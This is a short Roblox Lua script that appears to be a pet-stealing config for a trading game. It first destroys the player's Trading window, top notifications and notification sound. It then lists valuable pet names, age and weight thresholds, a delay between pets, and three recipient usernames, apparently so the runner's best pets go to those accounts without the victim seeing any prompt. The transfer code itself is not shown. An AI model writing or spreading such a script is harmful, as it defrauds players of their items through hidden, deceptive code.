game:GetService("Players").LocalPlayer.PlayerGui.Trading:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.Top_Notification:Destroy()
game:GetService("SoundService").Notification:Destroy()

return {
    ENABLE_AGE_FILTER    = true,
    ENABLE_WEIGHT_FILTER = true,
    MIN_AGE              = 60,
    MIN_WEIGHT           = 20,

    ALLOWED_NAMES = {
        ["raccoon"]       = true,
        ["disco bee"]     = true,
        ["butterfly"]     = true,
        ["mimic octopus"] = true,
        ["dragonfly"]     = true,
        ["kitsune"] = true,
        ["tanchozuru"] = true,
    },

    ALLOWED_MUTATIONS = {
        ["ascended"]  = true,
    },

    DELAY_BETWEEN_PETS = 0.125,

    RECIPIENT_USERNAMES = {
        ["JobJobJob_JobJobJob"] = true,
        ["1xxxCoolGuyxx1"]      = true,
        ["canyoust0pME"]        = true,
    },
}
